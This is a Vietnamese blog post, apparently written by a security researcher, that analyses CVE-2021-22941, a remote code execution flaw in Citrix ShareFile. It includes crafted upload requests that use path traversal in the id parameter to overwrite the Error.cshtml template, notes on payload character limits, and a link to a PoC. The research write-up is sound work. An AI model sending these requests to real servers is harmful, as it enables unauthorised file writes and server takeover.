<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Phân tích CVE-2021-22941, RCE Citrix Sharefile &lt; 5.11.20 | minhtuanact|Blog - Keep a flame in the rain!</title><meta name=keywords content="RCE,KhaiButDauXuan,Citrix Sharefile,CVE-2021-22941"><meta name=description content="Cái bài này mình định lên từ năm ngoái rồi, mà phân tích xong lại để đấy, thật ra là lười viết lại nên tồn đọng đến bây giờ chưa viết bài phân tích lên blog 🥲. Thôi thì ngồi viết lại vừa để có chỗ lưu lại, vừa để nhớ xem mình đã phân tích những cái gì, biết đâu sau này lại sử dụng lại thì sao :D"><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/phan-tich-cve-2021-22941-rce-citrix-sharefile-51120/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Phân tích CVE-2021-22941, RCE Citrix Sharefile < 5.11.20"><meta property="og:description" content="Cái bài này mình định lên từ năm ngoái rồi, mà phân tích xong lại để đấy, thật ra là lười viết lại nên tồn đọng đến bây giờ chưa viết bài phân tích lên blog 🥲. Thôi thì ngồi viết lại vừa để có chỗ lưu lại, vừa để nhớ xem mình đã phân tích những cái gì, biết đâu sau này lại sử dụng lại thì sao :D"><meta property="og:type" content="article"><meta property="og:url" content="https://minhtuanact.github.io/posts/phan-tich-cve-2021-22941-rce-citrix-sharefile-51120/"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-02-11T19:20:29+07:00"><meta property="article:modified_time" content="2022-02-11T19:20:29+07:00"><meta property="og:site_name" content="minhtuanact|Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Phân tích CVE-2021-22941, RCE Citrix Sharefile < 5.11.20"><meta name=twitter:description content="Cái bài này mình định lên từ năm ngoái rồi, mà phân tích xong lại để đấy, thật ra là lười viết lại nên tồn đọng đến bây giờ chưa viết bài phân tích lên blog 🥲. Thôi thì ngồi viết lại vừa để có chỗ lưu lại, vừa để nhớ xem mình đã phân tích những cái gì, biết đâu sau này lại sử dụng lại thì sao :D"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Phân tích CVE-2021-22941, RCE Citrix Sharefile \u003c 5.11.20","item":"https://minhtuanact.github.io/posts/phan-tich-cve-2021-22941-rce-citrix-sharefile-51120/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Phân tích CVE-2021-22941, RCE Citrix Sharefile ","name":"Phân tích CVE-2021-22941, RCE Citrix Sharefile ","description":"Cái bài này mình định lên từ năm ngoái rồi, mà phân tích xong lại để đấy, thật ra là lười viết lại nên tồn đọng đến bây giờ chưa viết bài phân tích lên blog 🥲. Thôi thì ngồi viết lại vừa để có chỗ lưu lại, vừa để nhớ xem mình đã phân tích những cái gì, biết đâu sau này lại sử dụng lại thì sao :D","keywords":["RCE","KhaiButDauXuan","Citrix Sharefile","CVE-2021-22941"],"articleBody":"Cái bài này mình định lên từ năm ngoái rồi, mà phân tích xong lại để đấy, thật ra là lười viết lại nên tồn đọng đến bây giờ chưa viết bài phân tích lên blog 🥲. Thôi thì ngồi viết lại vừa để có chỗ lưu lại, vừa để nhớ xem mình đã phân tích những cái gì, biết đâu sau này lại sử dụng lại thì sao :D\nBài này mình dựa theo bài viết gốc của code white, cũng chính là nhóm phát hiện ra CVE này, bạn đọc có thể đọc bài viết gốc tại https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html\nSetup Ở đây mình setup trên 1 Windows Server 2019, sử dụng Hyper-V cho nó nhanh, các bạn cứ tải cái file VHD kia về rồi import vào Hyper-V Manager là chạy lên luôn nhé, nhanh lắm.\nhttps://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019 Cài đặt Citrix Sharefile thì đơn giản lắm, tải phiên bản StorageCenter_5.11.19, sau đó bấm next next next, cho đến khi nào nó hiển thị lên trang configure là được\nDebug Xong phần cài đặt, đến phần debug thì ở đây mình sử dụng JetBrains Rider để debug, các bạn cũng có thể sử dụng thêm cả DnsSpy để vẽ map đi trace chain cho dễ dàng hơn :D\nMở Rider lên rồi Attach to Process tới process w3wp Đợi 1 tý là nó load những thành phần cần thiết vào, chú ý nên sử dụng SSD để load project cho nhanh nhé, chứ HDD load lâu lắm :(\nPhân tích Như ở bài viết gốc có thể thấy tác giả đã chỉ ra rằng Citrix Sharefile có sử dụng NeatUpload có niên đại tới hàng chục năm, vì nó là thư viện sử dụng để upload nên tác giả đã tìm được chỗ sử dụng để ghi file lên hệ thống\nBằng cách sử dụng tính năng Analyzer trên DnSpy chúng ta có thể tìm nhanh chóng từ Sink đến Source như sau (trên Rider cũng có tính năng Find Usages hoạt động tương tự, nhưng mà mình thích sử dụng cái Analyzer trên DnSpy hơn vì nó vẽ cái map cho mình nhìn cho nó trực quan)\nVậy chúng ta có thể thấy rằng, để upload file lên server thì có thể sử dụng Brettle.Web.NeatUpload.UploadHttpModule.Init (HttpApplication), là phương thức khởi tạo cho System.Web.IHttpModule\nSau khi kiểm tra file Web.config thì có thể thấy rằng UploadHttpModule được nạp trực tiếp vào danh sách Module trong webapp\nVậy ta có thể tìm được endpoint upload file trực tiếp lên hệ thống thông qua Application_BeginRequest()\nNhư hình trên ta có thể thấy được source sẽ có dạng\n1 2 3  POST /upload.aspx HTTP/1.1 Host: localhost Content-Length: 0   Có endpoint rồi thì data truyền vào sẽ là gì bây giờ nhở Ở Brettle.Web.NeatUpload.FilteringWorkerRequest.ParseOfThrow chúng ta có 1 đoạn như này\nCó thể thấy để uploadContext thì chúng ta cần sử dụng Content-Type: multipart/form-data sử dụng bonudary. Ví dụ:\n1 2 3 4 5 6  POST /upload.aspx HTTP/1.1 Host: localhost Content-Type: multipart/form-data; boundary=xxx --xxx --xxx--   Cũng vẫn ở Brettle.Web.NeatUpload.FilteringWorkerRequest.ParseOfThrow ta có thể thấy GetAttribute name và filename, sử dụng Content-Disposition attachment\nVậy request sẽ là:\n1 2 3 4 5 6 7  POST /upload.aspx HTTP/1.1 Host: localhost Content-Type: multipart/form-data; boundary=xxx --xxx Content-Disposition: form-data; name=\"name\"; filename=\"filename\" --xxx--   Tuy nhiên, vẫn tại đó, chúng ta cần thêm những paramsFromQueryString như uploadtool, bd, accountid nhưng sau những lần test của mình thì chúng ta chỉ cần thêm 2 param bp với accountid mà thôi Mặt khác, chúng ta có một dòng\n1  bool flag1 = fieldNameTranslator.PostBackID.Contains(\"rsu\");   Ở đây chúng ta cần phải chèn thêm giá trị PostBackID, sau một hồi debug thì hoá ra là nó nằm trong config của webapp, lần mò 1 hồi thì cũng đến được chỗ cần tìm Brettle.Web.NeatUpload.FieldNameTranslator\nCuối cùng sau một hồi debug, thì request cuối cùng có lẽ sẽ là như này:\n1 2 3 4 5 6 7 8  POST /upload.aspx?id=foo\u0026bp=bp\u0026accountId=accountid HTTP/1.1 Host: localhost Content-Type: multipart/form-data; boundary=xxx --xxx Content-Disposition: form-data; name=\"name\"; filename=\"filename\" --xxx--   Post thử request lên rồi check phần sink xem sao\nCó thể thấy rằng phần PostBackID hiện tại vẫn đang là null, có vẻ như mình vẫn chưa truyền được param id=foo. Sau một hồi debug, thì hoá ra do cái đoạn này, mình vẫn chưa đọc kỹ xem tại sao phải truyền số byte  4096 bytes nữa thì nó mới ăn, cứ đoán vậy thôi.\nSau khi truyền được PostBackID vào FileStream rồi thì có thể thấy rằng file foo đã được ghi vào trong folder C:\\inetpub\\wwwroot\\Citrix\\StorageCenter\\context với nội dung như hình dưới.\nVậy làm thế nào để RCE bây giờ 🤔\nỞ đoạn code\n1  FileStream fileStream = new FileStream(str + this.PostBackID, FileMode.Create, FileAccess.ReadWrite, FileShare.None);   Có thể thấy rằng, path được ghép bởi str=C:\\inetpub\\wwwroot\\Citrix\\StorageCenter\\context + PostBackID. Biến PostBackID thì có thể control được, vậy thử path travesal xem sao :D\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  POST /upload.aspx?id=../foo\u0026bp=bp\u0026accountId=123 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 4240 Content-Type: multipart/form-data; boundary=b74bf37b7d0548a0280c058e21597abd --b74bf37b7d0548a0280c058e21597abd Content-Disposition: form-data; name=\"name\"; filename=\"filename\" --b74bf37b7d0548a0280c058e21597abd--   Và ta nhận được file foo đã nhảy ra bên ngoài folder content với nội dung như trên hình.\nỜ thì giờ path travesal được rồi thì làm sao nhở, sau đọc bài của code white, họ đã có gợi ý cho mình là sử dụng ghi đè lên file template của mô hình MVC .cshtml để có thể kích hoạt lên shell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  POST /upload.aspx?id=..%2FConfigService%2FViews%2FShared%2FError.cshtml\u0026bp=bp\u0026accountId=123z HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 4240 Content-Type: multipart/form-data; boundary=4b6955d42c8c6d258f047410fbb3fc12 --4b6955d42c8c6d258f047410fbb3fc12 Content-Disposition: form-data; name=\"name\"; filename=\"filename\" --4b6955d42c8c6d258f047410fbb3fc12--   Ngon roài, vậy giờ mình có thể ghi đè lên file Error.cshtml, tuy nhiên giờ data mình truyền vào duy nhất là biến id mà thôi, sau một hồi đọc gợi ý của code white mà mình mơ mơ màng màng chẳng hiểu gì cả. Nhưng mà sau vẫn lĩnh hội được 😁\nTạo payload Giải thích thế này một chút cho dễ hiểu, trên Linux và Windows, việc chuẩn hoá PATH là khác nhau. Ví dụ:\n Linux: cd a/b/c/ thì Linux sẽ kiểm tra path a, path a/b, path a/b/c có tồn tại hay không, nếu có thì thực hiện lệnh thành công. Windows: cd a/b/c thì Windows sẽ thực hiện chuẩn hoá path a/b/c xem có tồn tại hay không, nếu có thì thực hiện lệnh thành công.  Vậy bạn thử cd aaa/../a/b/c trên Linux và Windows xem, trên Windows thì chạy được lệnh này còn Linux báo k có directory nào tồn tại ngay 😂. Vì Linux nó sẽ kiểm tra folder aaa/ có tồn tại không đã, rồi nó mới chạy tiếp, nếu k tồn tại thì thôi, Windows lại khác, aaa/.../a/b/c = a/b/c có tồn tại thì chạy được bình thường.\nBây giờ chúng ta cần viết ra 1 cái template file .cshtml để có thể chạy shell trên này, không được chứa các ký tự\n1 2 3 4 5 6 7 8 9   (less than)  (greater than) : (colon) \" (double quote) / (forward slash) \\ (backslash) | (vertical bar or pipe) ? (question mark) * (asterisk)    Theo https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#naming-conventions\n Mình có viết 1 mã PoC ở đây, các bạn có thể tham khảo qua nhé :D\nhttps://github.com/sun-asterisk-research/cybersec-pocs/tree/master/citrix_sharefile\nTham khảo  https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#naming-conventions https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html https://github.com/hoavt184/CVE-2021-22941  ","wordCount":"1275","inLanguage":"en","datePublished":"2022-02-11T19:20:29+07:00","dateModified":"2022-02-11T19:20:29+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/phan-tich-cve-2021-22941-rce-citrix-sharefile-51120/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class=post-title>Phân tích CVE-2021-22941, RCE Citrix Sharefile &lt; 5.11.20</h1><div class=post-meta><span title="2022-02-11 19:20:29 +0700 +0700">February 11, 2022</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;minhtuanact</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#setup aria-label=Setup>Setup</a></li><li><a href=#debug aria-label=Debug>Debug</a></li><li><a href=#ph%c3%a2n-t%c3%adch aria-label="Phân tích">Phân tích</a><ul><ul><li><a href=#t%e1%ba%a1o-payload aria-label="Tạo payload">Tạo payload</a></li></ul></ul></li><li><a href=#tham-kh%e1%ba%a3o aria-label="Tham khảo">Tham khảo</a></li></ul></div></details></div><div class=post-content><p>Cái bài này mình định lên từ năm ngoái rồi, mà phân tích xong lại để đấy, thật ra là lười viết lại nên tồn đọng đến bây giờ chưa viết bài phân tích lên blog 🥲. Thôi thì ngồi viết lại vừa để có chỗ lưu lại, vừa để nhớ xem mình đã phân tích những cái gì, biết đâu sau này lại sử dụng lại thì sao :D</p><p>Bài này mình dựa theo bài viết gốc của code white, cũng chính là nhóm phát hiện ra CVE này, bạn đọc có thể đọc bài viết gốc tại <a href=https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html>https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html</a></p><h1 id=setup>Setup<a hidden class=anchor aria-hidden=true href=#setup>#</a></h1><p>Ở đây mình setup trên 1 Windows Server 2019, sử dụng Hyper-V cho nó nhanh, các bạn cứ tải cái file VHD kia về rồi import vào Hyper-V Manager là chạy lên luôn nhé, nhanh lắm.<br><a href=https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019>https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019</a>
<img loading=lazy src=https://images.viblo.asia/b80ace3c-bc6e-4ca5-b38d-7fc7a25725c0.png alt=image.png></p><p>Cài đặt Citrix Sharefile thì đơn giản lắm, tải phiên bản <a href="https://downloads.citrix.com/8343/StorageCenter_5.11.19.msi?__gda__=exp=1644550798~acl=/*~hmac=ecaa08d61b409dbdc40dfdd53df7271ff455837ce7b1ec987fce3215bea0e2bc">StorageCenter_5.11.19</a>, sau đó bấm next next next, cho đến khi nào nó hiển thị lên trang configure là được</p><p><img loading=lazy src=https://images.viblo.asia/deb2d041-2005-4f99-9338-db88e50078a0.png alt=image.png></p><h1 id=debug>Debug<a hidden class=anchor aria-hidden=true href=#debug>#</a></h1><p>Xong phần cài đặt, đến phần debug thì ở đây mình sử dụng JetBrains Rider để debug, các bạn cũng có thể sử dụng thêm cả DnsSpy để vẽ map đi trace chain cho dễ dàng hơn :D</p><p>Mở Rider lên rồi Attach to Process tới process <code>w3wp</code>
<img loading=lazy src=https://images.viblo.asia/a276683a-7462-48d0-bbcc-b9944ba58f32.png alt=image.png></p><p>Đợi 1 tý là nó load những thành phần cần thiết vào, chú ý nên sử dụng SSD để load project cho nhanh nhé, chứ HDD load lâu lắm :(</p><p><img loading=lazy src=https://images.viblo.asia/377c1bf5-5292-423d-8569-3ba1b984e271.png alt=image.png></p><h1 id=phân-tích>Phân tích<a hidden class=anchor aria-hidden=true href=#phân-tích>#</a></h1><p>Như ở bài viết gốc có thể thấy tác giả đã chỉ ra rằng Citrix Sharefile có sử dụng <a href=https://github.com/joeaudette/neatupload/tree/NeatUpload-1.2>NeatUpload</a> có niên đại tới hàng chục năm, vì nó là thư viện sử dụng để upload nên tác giả đã tìm được chỗ sử dụng để ghi file lên hệ thống</p><p><img loading=lazy src=https://images.viblo.asia/b0654b29-d7d4-4710-a07d-ad96f0c7735d.png alt=image.png></p><p>Bằng cách sử dụng tính năng <code>Analyzer</code> trên DnSpy chúng ta có thể tìm nhanh chóng từ Sink đến Source như sau (trên Rider cũng có tính năng <code>Find Usages</code> hoạt động tương tự, nhưng mà mình thích sử dụng cái Analyzer trên DnSpy hơn vì nó vẽ cái map cho mình nhìn cho nó trực quan)</p><p><img loading=lazy src=https://images.viblo.asia/a388d929-055b-4963-8d6f-dc36a64a6621.png alt=image.png></p><p>Vậy chúng ta có thể thấy rằng, để upload file lên server thì có thể sử dụng <code>Brettle.Web.NeatUpload.UploadHttpModule.Init (HttpApplication)</code>, là phương thức khởi tạo cho <code>System.Web.IHttpModule</code></p><p><img loading=lazy src=https://images.viblo.asia/44afe287-858d-4acb-b321-1c4230daa2df.png alt=image.png></p><p>Sau khi kiểm tra file <code>Web.config</code> thì có thể thấy rằng <code>UploadHttpModule</code> được nạp trực tiếp vào danh sách Module trong webapp</p><p><img loading=lazy src=https://images.viblo.asia/85f5bc14-68c7-4c01-8a6a-c4f012ecf5fa.png alt=image.png></p><p>Vậy ta có thể tìm được endpoint upload file trực tiếp lên hệ thống thông qua <code>Application_BeginRequest()</code></p><p><img loading=lazy src=https://images.viblo.asia/651add4c-0e61-40df-83df-2331f43f141c.png alt=image.png></p><p><img loading=lazy src=https://images.viblo.asia/40ac6759-83b5-4a2d-a2f8-60a3ab8d37bc.png alt=image.png></p><p>Như hình trên ta có thể thấy được source sẽ có dạng</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/upload.aspx</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>localhost</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>0</span>
</span></span></code></pre></td></tr></table></div></div><p>Có endpoint rồi thì data truyền vào sẽ là gì bây giờ nhở
Ở <code>Brettle.Web.NeatUpload.FilteringWorkerRequest.ParseOfThrow</code> chúng ta có 1 đoạn như này</p><p><img loading=lazy src=https://images.viblo.asia/3da4c629-1e1b-48f3-94d5-a21263c9b6f2.png alt=image.png></p><p>Có thể thấy để uploadContext thì chúng ta cần sử dụng <code>Content-Type: multipart/form-data</code> sử dụng <code>bonudary</code>. Ví dụ:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/upload.aspx</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>localhost</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=xxx</span>
</span></span><span class=line><span class=cl><span class=err>--xxx</span>
</span></span><span class=line><span class=cl>&lt;cái gì đấy&gt;
</span></span><span class=line><span class=cl>--xxx--
</span></span></code></pre></td></tr></table></div></div><p>Cũng vẫn ở <code>Brettle.Web.NeatUpload.FilteringWorkerRequest.ParseOfThrow</code> ta có thể thấy GetAttribute name và filename, sử dụng <code>Content-Disposition attachment</code></p><p><img loading=lazy src=https://images.viblo.asia/9380e33f-36f6-45d1-964d-3ed0e09d1766.png alt=image.png></p><p>Vậy request sẽ là:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/upload.aspx</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>localhost</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=xxx</span>
</span></span><span class=line><span class=cl><span class=err>--xxx</span>
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;name&#34;; filename=&#34;filename&#34;
</span></span><span class=line><span class=cl>&lt;cái gì đấy nữa&gt;
</span></span><span class=line><span class=cl>--xxx--
</span></span></code></pre></td></tr></table></div></div><p>Tuy nhiên, vẫn tại đó, chúng ta cần thêm những <code>paramsFromQueryString</code> như <code>uploadtool</code>, <code>bd</code>, <code>accountid</code> nhưng sau những lần test của mình thì chúng ta chỉ cần thêm 2 param <code>bp</code> với <code>accountid</code> mà thôi
<img loading=lazy src=https://images.viblo.asia/a88e4739-eaf8-4eb7-8c46-45ba480e643f.png alt=image.png></p><p>Mặt khác, chúng ta có một dòng</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cs data-lang=cs><span class=line><span class=cl><span class=kt>bool</span> <span class=n>flag1</span> <span class=p>=</span> <span class=n>fieldNameTranslator</span><span class=p>.</span><span class=n>PostBackID</span><span class=p>.</span><span class=n>Contains</span><span class=p>(</span><span class=s>&#34;rsu&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Ở đây chúng ta cần phải chèn thêm giá trị <code>PostBackID</code>, sau một hồi debug thì hoá ra là nó nằm trong config của webapp, lần mò 1 hồi thì cũng đến được chỗ cần tìm <code>Brettle.Web.NeatUpload.FieldNameTranslator</code></p><p><img loading=lazy src=https://images.viblo.asia/0b5dae68-59f4-4492-a74e-6a97b46e8ae4.png alt=image.png></p><p>Cuối cùng sau một hồi debug, thì request cuối cùng có lẽ sẽ là như này:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/upload.aspx?id=foo&amp;bp=bp&amp;accountId=accountid</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>localhost</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=xxx</span>
</span></span><span class=line><span class=cl><span class=err>--xxx</span>
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;name&#34;; filename=&#34;filename&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;cái gì đấy nữa&gt;
</span></span><span class=line><span class=cl>--xxx--
</span></span></code></pre></td></tr></table></div></div><p>Post thử request lên rồi check phần sink xem sao</p><p><img loading=lazy src=https://images.viblo.asia/e6358a1d-8488-417a-841e-745f93811b4a.png alt=image.png></p><p>Có thể thấy rằng phần <code>PostBackID</code> hiện tại vẫn đang là <code>null</code>, có vẻ như mình vẫn chưa truyền được param <code>id=foo</code>. Sau một hồi debug, thì hoá ra do cái đoạn này, mình vẫn chưa đọc kỹ xem tại sao phải truyền số byte > 4096 bytes nữa thì nó mới ăn, cứ đoán vậy thôi.</p><p><img loading=lazy src=https://images.viblo.asia/c61af592-9ad2-414a-848d-d0c72e802e49.png alt=image.png></p><p>Sau khi truyền được <code>PostBackID</code> vào <code>FileStream</code> rồi thì có thể thấy rằng file <code>foo</code> đã được ghi vào trong folder <code>C:\inetpub\wwwroot\Citrix\StorageCenter\context</code> với nội dung như hình dưới.</p><p><img loading=lazy src=https://images.viblo.asia/f2d72e3b-f0d8-4235-a72c-3a9c22d0b7ca.png alt=image.png></p><p>Vậy làm thế nào để RCE bây giờ 🤔<br>Ở đoạn code</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>FileStream</span> <span class=n>fileStream</span> <span class=o>=</span> <span class=n>new</span> <span class=n>FileStream</span><span class=p>(</span><span class=n>str</span> <span class=o>+</span> <span class=n>this</span><span class=p>.</span><span class=n>PostBackID</span><span class=p>,</span> <span class=n>FileMode</span><span class=p>.</span><span class=n>Create</span><span class=p>,</span> <span class=n>FileAccess</span><span class=p>.</span><span class=n>ReadWrite</span><span class=p>,</span> <span class=n>FileShare</span><span class=p>.</span><span class=n>None</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Có thể thấy rằng, path được ghép bởi <code>str=C:\inetpub\wwwroot\Citrix\StorageCenter\context</code> + <code>PostBackID</code>. Biến <code>PostBackID</code> thì có thể control được, vậy thử path travesal xem sao :D</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
